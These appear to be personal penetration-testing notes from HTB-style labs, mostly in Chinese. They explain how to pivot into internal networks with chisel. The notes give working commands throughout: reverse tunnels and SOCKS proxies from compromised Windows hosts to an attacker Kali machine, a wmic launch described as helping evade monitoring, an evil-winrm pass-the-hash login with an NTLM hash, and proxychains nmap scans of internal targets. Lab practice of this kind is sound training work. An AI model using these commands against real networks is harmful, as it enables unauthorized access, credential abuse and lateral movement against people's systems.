https://github.com/jpillora/chisel


KALI  192.168.45.180
```
 chisel server -p 7000 --reverse --socks5
```
VM1 :10.10.166.141 AND 192.168.206.141
```
.\chisel.exe client 192.168.45.180:7000  R:7778:10.10.166.140:5985
```
KALI TO VM2.        VM2 :10.10.166.140
```
 evil-winrm -i 127.0.0.1 -P 7778 -u tom_admin -H '4979d69d4ca66955c075c41cf45f24dc'


```
ALL SEND TO KAIL 7778, WILL resend to  10.10.166.140:5985


```



explain in chinese: PS C:\wamp64\attendance\images> wmic process call create "C:\wamp64\attendance\images\chisel.8080 R:socks"
wmic process call create "C:\wamp64\attendance\images\chisel.exe client 192.168.45.180:8080 R:socks"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 4128;
        ReturnValue = 0;
};

PS C:\wamp64\attendance\images>

### 🧾 命令含义逐项解释：

#### ▶️ `wmic process call create "..."`

- 使用 WMIC 调用 Win32_Process 类的 `Create()` 方法
    
- 在目标主机上创建一个新的进程（执行你指定的命令）
    

---

#### ▶️ `"C:\wamp64\attendance\images\chisel.exe client 192.168.45.180:8080 R:socks"`

- 你要启动的是 `chisel.exe`，是一个用于内网穿透的工具
    
- 你启动的是 **客户端模式**
    
- 连接到你的攻击机 `192.168.45.180`，端口 `8080`
    
- 开启 `socks` 代理（通过反向通道访问目标内网）
    

---

### 💡 整体意思：

你在目标机器上通过 `wmic` 成功执行了如下命令：

`C:\wamp64\attendance\images\chisel.exe client 192.168.45.180:8080 R:socks`

该命令的作用是：

- 从目标机器向你的攻击者机器发起连接
    
- 连接后，你的攻击机会获得一个 socks 代理通道
    
- 可以通过该通道访问目标内网中的其他主机（横向移动）
    

---

### 📋 输出说明：

`Method execution successful. ProcessId = 4128; ReturnValue = 0;`

- `Method execution successful.`：命令创建进程成功
    
- `ProcessId = 4128`：chisel 被赋予的进程 ID 是 4128
    
- `ReturnValue = 0`：0 表示调用成功（符合 COM 标准）
    

---

## ✅ 总结

你成功通过 `wmic` 执行了 `chisel.exe` 并启动了 SOCKS 代理客户端：

| 项目    | 说明                                               |
| ----- | ------------------------------------------------ |
| 工具    | chisel                                           |
| 模式    | client 模式，反向连接                                   |
| 控制服务器 | 192.168.45.180:8080                              |
| 功能    | 向攻击者建立 socks5 代理隧道                               |
| 方法    | 使用 `wmic process call create` 创建进程（无窗口，适合绕过部分监控） |
```
.\chisel.exe client 192.168.45.180:9999 R:2222::10.10.104.142:3389 R:7778:10.10.104.142:5985
```

把本机（Win1）上的 chisel 客户端连接到你在 Kali 的 chisel server（`192.168.45.180:9999`），并在 server 端创建两个**反向监听**（reverse tunnels）：

- 在 server（Kali）开端口 **2222**，把到该端口的流量转发到 `10.10.104.142:3389`（Win2 的 RDP）。
    
- 在 server（Kali）开端口 **7778**，把到该端口的流量转发到 `10.10.104.142:5985`（Win2 的 WinRM）。
    

客户端（Win1）会保持与 server 的 websocket 连接，所有通过 server 上的这些监听端口来的流量都会经由 Win1 转发到 Win2。
1. `.\chisel.exe`  
    → 在 Windows 下执行 chisel 可执行文件（当前目录下）。
    
2. `client 192.168.45.180:9999`  
    → 以 **client** 模式连接到 chisel server 的控制端口 `192.168.45.180:9999`（这是控制/管理通道，用来协商隧道）。
    
3. `R:2222::10.10.104.142:3389`（第一个隧道）
    
    - `R:` 表示 **reverse**（反向隧道）：请求 server 在其一侧 **监听一个端口**，并把到该监听端口的连接通过 client（Win1）转发到指定目标（Win2）。
        
    - `2222` 是 **server 侧要监听的端口**（也就是你在 Kali 上会看到有服务监听 2222）。
        
    - 接着的 `::10.10.104.142:3389` 中间有两个 `::` —— 这里的第二个冒号前是**空的 bind 地址**（等同于没有显式写 bind 地址）。通常这表示**binding 到所有接口 / 0.0.0.0（或者使用 chisel 的默认绑定行为）**，也就是说 server 上的 `2222` 可能对外可达（依据 chisel 版本/实现与系统防火墙）。
        
    - 最后的 `10.10.104.142:3389` 是**目标主机与端口**（Win2 的 RDP）。
        
    - 合起来的语义就是：在 Kali 上监听 `:2222`（可能是 0.0.0.0:2222），当有连接进来时，chisel 会把流量通过 Win1 转发到 `10.10.104.142:3389`。
        
    
    > 备注：很多人更常用且更明确的写法是 `R:127.0.0.1:2222:10.10.104.142:3389`（显式指定 server 只绑定到 localhost），或者 `R:0.0.0.0:2222:10.10.104.142:3389`（显式绑定到所有接口）。双冒号语法往往是“省略了 bind 地址”的缩写。
    
4. `R:7778:10.10.104.142:5985`（第二个隧道）
    
    - 更常见的三段写法（没有空 bind）：`R:<server_port>:<target_host>:<target_port>`。这里表示在 server 上监听 `7778`，并把流量转到 `10.10.104.142:5985`（WinRM）。
        
    - 也就是说，连接到 Kali 的 `127.0.0.1:7778`（或 `KaliIP:7778`，取决于 bind）会被转发到 Win2 的 WinRM 服务。
        

---

## 为什么会用两个 `R:`（好处）

- 同一条 client 连接可以一次性声明 **多个反向隧道**，这样只用一条 outbound 连接就能同时转发多个服务（RDP、WinRM、SMB 等）。
    
- 节省通道数量，方便管理。


# 目标

让 Kali（192.168.45.199）可以扫描 **仅 Windows 可访问的内网目标 10.10.101.152**

---

# 📌 网络结构回顾（非常关键）

|设备|IP|可访问性|
|---|---|---|
|**Kali**|192.168.45.199|无法直接访问 10.10.101.0/24|
|**Windows（Pivot 主机）**|192.168.141.153、10.10.101.153|可访问目标 10.10.101.152|
|**目标机器**|10.10.101.152|仅 Windows 内侧网卡能访问|

---

# 🎯 最推荐的方案：**反向 SOCKS 隧道**（最灵活)

因为很多时候 Kali 无法主动访问 HTB 内部 Windows  
所以我们使用最通用的：

> **Windows → Kali 发起反向连接**  
> Kali 得到一个 SOCKS5 代理  
> 再用 `proxychains` / `nmap` / 浏览器对 10.10.101.152 扫描

---

# 🚀 步骤 1：在 Kali 上启动 chisel 服务器（监听）

在 Kali 运行：

`chisel server -p 9001 --reverse`

解释：

- `server`：Kali 当服务端
    
- `-p 9001`：监听 9001 端口
    
- `--reverse`：允许被控端（Windows）反向连接并创建隧道
    

---

# 🚀 步骤 2：在 Windows（可控主机）运行 chisel 客户端

假设你把 chisel.exe 上传到了 Windows 上（如 C:\Tools\chisel.exe）

运行：

```
chisel.exe client 192.168.45.199:9001 R:1080:socks
```

解释：

- `client`：Windows 作为客户端
    
- `192.168.45.199:9001`：连接 Kali 的监听端口
    
- `R:1080:socks`：在 Kali 端创建 **反向 SOCKS5 代理**（本地端口 1080）
    

建立后你会看到 “client connected” 之类的提示。

---

# 🚀 步骤 3：在 Kali 上配置 proxychains

编辑：

`sudo nano /etc/proxychains.conf`

在最后添加：

`socks5  127.0.0.1 1080`

保存。

---

# 🚀 步骤 4：通过 SOCKS 代理扫描目标 10.10.101.152

可以扫描端口：

`proxychains nmap -sT -Pn 10.10.101.152`

也可以使用其他工具，例如：

`proxychains curl http://10.10.101.152`

或

`proxychains smbclient -L 10.10.101.152 -U ''`

---

# 🔍 验证隧道是否正常工作

在 Windows 上：

`ping 10.10.101.152`

如果通，则网络路径正确。

在 Kali 上：

`proxychains ping 10.10.101.152`

如果显示 "proxychains ping xxx SOCKS5..."，说明流量被成功代理。

---

# 🎉 完成！

你现在已经可以从 Kali 直接扫描内部网段 **10.10.101.152**  
即便你本来不在这个网络内。

下一步你应该做什么（HTB 场景最标准的流程）
✔️ 1. 扫描全端口（internal pivot 常规操作）

目标可能只开放非常不常见的端口（如 8443、2222、31337、高端口等）。

使用低速全端口扫描：

proxychains nmap -sT -Pn -p- --min-rate 80 10.10.101.152 -oN full.txt


如果 HTB 网络负载高，可以更慢一点：

proxychains nmap -sT -Pn -p- --min-rate 30 10.10.101.152 -oN full-slow.txt


这一步几乎总是能找到真正开放的端口。
很多 HTB pivot 机器只在高端口开放 1~2 个关键服务。

✔️ 2. 扫描 UDP（必要时）

HTB 有不少机器只开放 UDP（SNMP、CoAP、custom 等）：

proxychains nmap -sU -Pn -p 53,67,68,123,161,500,4500 10.10.101.152


或简化：

proxychains nmap -sU -Pn --top-ports 50 10.10.101.152

✔️ 3. 确认 pivot（在 Windows 上）能 ping 或访问端口

如果你有 Shell/Command Execution，在 pivot 上确认：

PowerShell：

ping 10.10.101.152
Test-NetConnection -ComputerName 10.10.101.152 -Port 80
Test-NetConnection -ComputerName 10.10.101.152 -Port 445


你会看到：

ping 可能通

端口全部失败 → 表示目标就是关了一切服务（正常）

💡 小贴士（非常常见）

HTB 内网 pivot 机器 经常设置成：

系统在线

但只开放 1 个端口

而且不在常见端口范围内

必须做全端口扫描才能找到入口

你现在看到的症状完全符合这种情况。

![[Pasted image 20251117174625.png]]

# 🔍 **图的解读**

### ✔️ Kali

- 作为 **chisel server --reverse**
    
- 通过 socks5 本地 1080 端口访问内部网
    
- 使用 proxychains 将所有扫描工具的流量推入隧道（nmap / curl / impacket 等）
    

### ✔️ Windows Pivot

- 同时连接两个网络：
    
    - 外网侧（你的 VPN/HTB 互通）：`192.168.141.153`
        
    - 内部网络：`10.10.101.153`
        
- 扮演流量中继（pivot）
    
- 运行 `chisel client` 建立反向 SOCKS 隧道
    

### ✔️ 内部目标

- `10.10.101.152`
    
- 你已经确认所有常用端口均 **filtered**
    
- 表示端口被防火墙阻断或服务不在常规端口上
    
- 下一步需要执行全端口扫描（-p-）